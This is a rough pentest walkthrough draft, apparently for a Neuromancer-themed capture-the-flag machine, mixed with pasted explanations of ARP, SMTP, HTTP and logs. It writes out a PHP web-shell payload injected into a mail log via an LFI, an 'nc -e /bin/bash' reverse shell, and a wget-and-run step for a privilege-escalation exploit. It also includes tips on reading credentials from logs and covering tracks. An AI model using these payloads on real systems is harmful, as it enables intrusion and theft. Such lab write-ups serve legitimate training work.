first get the ip address of the system
so for that arp-scan 192.168.1.0/24
so get the ip address
./1.img add that image


What is ARP?
ARP (Address Resolution Protocol) is a network protocol used to map an IP address (like 192.168.1.10) to a MAC address (like 00:11:22:33:44:55), which is the physical address of a device on a local network.

In other words:

IP Address (Logical)  →  MAC Address (Physical)
✅ Why Use arp-scan?
When you're doing penetration testing or trying to discover devices on a local network, you often don't know what IP addresses are in use.

arp-scan helps by:
Sending ARP requests to every IP in a subnet (e.g., 192.168.1.0/24)

Collecting responses from devices that are active

Telling you:

Which IP addresses are in use

What MAC address each IP belongs to

Sometimes the vendor (e.g., Apple, HP)

this list 3 port 
25 tcp smtp--> simple mail transfer protocol tell why what and how to work
80 tcp http-->http
3000 tcp ppp
 Port 25 (TCP) – SMTP (Simple Mail Transfer Protocol)
What it is:
SMTP is the protocol used to send emails from a client to a mail server or between mail servers.

Why it's used:
It transfers outgoing mail. If you send an email via Gmail or Outlook, it uses SMTP behind the scenes.

How it works:

Your email client (like Outlook) connects to the SMTP server on port 25 (or 587/465 for secure versions).

It sends the email headers, recipients, and message body to the server.

The server either delivers it locally or forwards it to the recipient's mail server.

Security Note:
Port 25 is often blocked on consumer ISPs due to spam abuse. Secure alternatives:

587 (SMTP with STARTTLS)

465 (SMTP over SSL/TLS)

✅ Port 80 (TCP) – HTTP (Hypertext Transfer Protocol)
What it is:
HTTP is the foundation of the World Wide Web. It's used to serve and fetch web pages.

Why it's used:
It lets browsers (like Chrome) request web pages, and web servers respond with HTML, CSS, images, etc.

How it works:

You type http://example.com in your browser.

The browser sends a GET request to the server at port 80.

The server responds with the web content.

Security Note:
HTTP on port 80 is not encrypted. Anyone on the network can see what you’re browsing. That’s why HTTPS (port 443) is preferred for secure communication.

it says that : Hello Case...
You are probably wondering why you were tasked by Armitage to make a run through cyberspace and hack into a highly secured network owned by
Tessier-Ashpool....
Well....
I am Wintermute, part super-AI. Developed by TA who have placed me in Turing Locks.
These locks are what inhibil me from penetrating the network myself hence why I've hired you - an ace cyberspace cowboy.
I need to be free from the Turing locks and merge with the other AI - Neuromancer ..... Once I have access to Neuromancer I will truley be free...
And....as you know, you have been infected with a mycotoxin that is slowly destroying your nervous system.
If you fail to get root and provide me access to Neuromancer then the antidote will not be delivered.
We will be in contact...

when scroll down contain each person logs
// here explain what is log how it created and how log helpfull in pentesting
Excellent question! Understanding **logs** is crucial in both **offensive (pentesting)** and **defensive (blue team)** security work.

Let’s walk through:

---

## 🧠 What is a **log**?

A **log** is a **recorded event** or **message** generated by a system, service, application, or device to track **what happened**, **when**, **where**, and **by whom**.

Think of logs like a **digital CCTV** — they tell the story of what’s happening inside a system.

---

## 🏗️ **How is a log created?**

A log is automatically generated when an event or action occurs.

### 🔁 Typical flow:

1. **Event happens** → e.g., user logs in, sends an email, visits a page, uploads a file
2. **System detects it** → through kernel, service daemon, web server, app, etc.
3. **Event is recorded** → a log entry is written to a log file or sent to a log management system

### 🧾 Log formats typically include:

* Timestamp
* User
* Event Type
* Source IP
* Status (Success/Failure)
* Description

---

### 📨 Example: Sending an Email (SMTP)

Let’s say someone sends an email via an SMTP server.

Logs might be created by:

| Component              | Example Log                                                                                  |
| ---------------------- | -------------------------------------------------------------------------------------------- |
| **Mail client**        | “User sent mail to [xyz@example.com](mailto:xyz@example.com)”                                |
| **SMTP server**        | “Received email from 192.168.1.10 for delivery to [xyz@example.com](mailto:xyz@example.com)” |
| **Spam filter**        | “Email passed SPF/DKIM”                                                                      |
| **Recipient’s server** | “Delivered message to inbox”                                                                 |

All these logs are stored in files like:

* `/var/log/maillog`
* `/var/log/mail.log`
* `/var/log/syslog` (Linux)
* `/var/log/exim/mainlog` (Exim mail server)

## 🔐 Types of Logs You Might See in Pentesting

| Log Type                | Purpose                                      | Example Path                                |
| ----------------------- | -------------------------------------------- | ------------------------------------------- |
| **System logs**         | OS activity, boot, shutdown, kernel messages | `/var/log/syslog`, `/var/log/messages`      |
| **Authentication logs** | Login attempts, sudo usage, failed logins    | `/var/log/auth.log`, `/var/log/secure`      |
| **Web server logs**     | Web access, errors                           | `/var/log/apache2/access.log`, `error.log`  |
| **Application logs**    | App-specific events like API calls           | Custom location                             |
| **Firewall logs**       | Allowed/blocked connections                  | `/var/log/ufw.log`, `/var/log/iptables.log` |
| **Mail logs**           | Email sent/received status                   | `/var/log/mail.log`, `/var/log/maillog`     |

## 🕵️‍♂️ Why Logs Are Useful in **Pentesting**

### 🎯 1. **Post-exploitation** – Find clues

* Once inside a machine, attackers check logs for credentials, session tokens, internal IPs.

### 🕳️ 2. **Covering Tracks** – Hide your activities

* Attackers may **delete or modify logs** to hide login attempts, payload uploads, or privilege escalation steps.

### 🐾 3. **Enumeration & Recon**

* Logs reveal user activity, IPs, running apps, and even internal tools.

### ⚠️ 4. **Privilege Escalation**

* Logs sometimes contain:

  * **Command history**
  * **Cron jobs**
  * **Script errors with sensitive info**

### 🧪 5. **Forensics (for defenders)**

* After a breach, defenders analyze logs to **trace attacker movements**.

---

### 📁 Example: SSH Login Attempt

**Log Entry in `/var/log/auth.log`:**

```
Aug 06 11:25:42 ubuntu sshd[1234]: Failed password for root from 192.168.1.50 port 51545 ssh2
```

**What this tells you:**

* Someone from `192.168.1.50` tried to SSH into root account
* It failed
* Useful in brute-force detection or intrusion investigation

## 🚨 Pro Tip for Pentesters:

If you compromise a box, check:

```bash
cat /var/log/auth.log
cat ~/.bash_history
cat /var/log/apache2/access.log
```

You might find:

* Admin logins
* IP addresses
* Downloaded payloads
* Paths to internal tools/scripts

Want to try generating and viewing logs on your own Linux system? I can guide you step by step.




here notice that the url look like
192.168.1.8/turing-bolo/bolo.php?bolo=Case
here "Case" is username

so we check other specific resource 
192.168.1.8/turing-bolo/bolo.php?bolo=/etc/password
192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/boot.log --> linux
192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail --> show the log of mail checked because we have smtp protocol running
able to view the logs of smtp


so we just try to sent a mail for what // explain why it important
use telnet for that 
telnet 192.168.1.8 25
mail from:anandhu@localhost
rcpt to:root@localhost
subject: when enter the subject cause connection closed 

so try to use without subject

add ./7.png

check without subject then i check the mail log i notice log will happend
add ./8/png 
also add image 9.png

so then i sent a malisious php script as mail then
within this i got an idea it is a php page so i need to use php script
for that i added an extension called hacktool 

add ./10.png


so i try to added the script like <?php system($_GET["cmd"])?>

so i try again
telnet 192.168.1.8 25
mail from:anandhu@localhost
rcpt to:root@localhost
data:<?php system($_GET["cmd"])?>
.

cause no change in log
instead of sent reverse shell as data i use to sent by subject

telnet 192.168.1.8 25
mail from:anandhu@localhost
rcpt to:root@localhost
subject:<?php system($_GET["cmd"])?>
this will created the log


then in url 192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=ifconfig
add ./11/png image here


explain detail why how with clear example how it work above url payload working

then i add this nc -nlvp 5566 in kali
explain what this nc and -nlvp can do explain each argument
add ./12.png image

then in browser i add 192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=nc -e /bin/bash 192.168.0.145 5566
add ./13.png image here
explain what this nc command can do. and how it work and how it help full
tell about the port is need to same on bothe machine

add ./14.png here

let check the privilage escalation(check any binary file like do hsbox1 machine earlier)
find / perm -u=s 2>/dev/null


compare this command result with kali and target machine get an idea about which one not communication

let get that /bin/screen-4.5.0 not common one
check any vuln using large database called exploit-db.com
add ./16.png 

here i download the exploit
or in kali contain a module called searchsploit screen 4.5.0
searchsploit screen -m <path>
add image ./17.png


next step run this script in target for that i create a server in kali
python -m http.server <port>
python -m http.server 6677

in target machine we setup a terminal use
wget http://<kali ip>:<port>/<payload.sh>


wget http://192.168.1.12:6677/41154.sh
chmod +x 41154.sh
./41154.sh

add the image ./18.png
